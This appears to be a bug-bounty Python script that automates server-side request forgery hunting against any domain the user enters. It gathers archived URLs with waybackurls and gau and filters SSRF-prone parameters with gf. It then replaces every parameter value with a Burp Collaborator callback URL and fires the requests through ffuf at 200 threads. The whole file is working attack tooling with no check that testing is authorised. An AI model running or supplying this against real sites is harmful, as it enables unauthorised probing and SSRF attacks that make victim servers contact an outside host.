import os
import requests
import subprocess
from urllib.parse import urlparse

# Tool configuration
BURP_COLLABORATOR_PAYLOAD = "http://your-collaborator-id.burpcollaborator.net"
OUTPUT_DIR = "ssrf_results"

# Create output directory if it doesn't exist
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def gather_urls(domain):
    """Gather URLs using waybackurls and gau."""
    wayback_file = os.path.join(OUTPUT_DIR, "waybackurls.txt")
    gau_file = os.path.join(OUTPUT_DIR, "gau_urls.txt")
    combined_file = os.path.join(OUTPUT_DIR, "combined_urls.txt")

    # Run waybackurls
    print("[+] Gathering URLs with waybackurls...")
    with open(wayback_file, "w") as f:
        subprocess.run(["waybackurls", domain], stdout=f)

    # Run gau
    print("[+] Gathering URLs with gau...")
    with open(gau_file, "w") as f:
        subprocess.run(["gau", "-subs", domain], stdout=f)

    # Combine and deduplicate results
    print("[+] Combining and deduplicating URLs...")
    with open(combined_file, "w") as f:
        subprocess.run(["sort", "-u", wayback_file, gau_file], stdout=f)

    return combined_file

def filter_ssrf_urls(input_file):
    """Filter URLs with potential SSRF parameters."""
    filtered_file = os.path.join(OUTPUT_DIR, "ssrf_candidates.txt")
    print("[+] Filtering URLs for SSRF candidates...")
    with open(filtered_file, "w") as f:
        subprocess.run(["gf", "ssrf", input_file], stdout=f)
    return filtered_file

def inject_payload(input_file, payload):
    """Replace parameter values with the payload."""
    payload_file = os.path.join(OUTPUT_DIR, "ssrf_payloads.txt")
    print("[+] Injecting payload into SSRF candidates...")
    with open(input_file, "r") as infile, open(payload_file, "w") as outfile:
        for line in infile:
            url = line.strip()
            parsed = urlparse(url)
            query = parsed.query
            if query:
                # Replace parameter values with the payload
                new_query = "&".join(f"{k}={payload}" for k, v in [q.split("=") for q in query.split("&")])
                new_url = parsed._replace(query=new_query).geturl()
                outfile.write(new_url + "\n")
    return payload_file

def fuzz_urls(payload_file):
    """Fuzz URLs with ffuf."""
    results_file = os.path.join(OUTPUT_DIR, "fuzz_results.txt")
    print("[+] Fuzzing URLs with ffuf...")
    subprocess.run([
        "ffuf", "-c", "-w", payload_file, "-u", "FUZZ", "-t", "200", "-o", results_file
    ])
    return results_file

def main():
    domain = input("Enter the target domain (e.g., example.com): ").strip()
    print("[+] Starting SSRF automation for domain:", domain)

    # Step 1: Gather URLs
    combined_urls = gather_urls(domain)

    # Step 2: Filter SSRF URLs
    ssrf_candidates = filter_ssrf_urls(combined_urls)

    # Step 3: Inject payload
    payload_file = inject_payload(ssrf_candidates, BURP_COLLABORATOR_PAYLOAD)

    # Step 4: Fuzz URLs
    fuzz_results = fuzz_urls(payload_file)

    print("[+] Process complete. Results saved in:", OUTPUT_DIR)

if __name__ == "__main__":
    main()
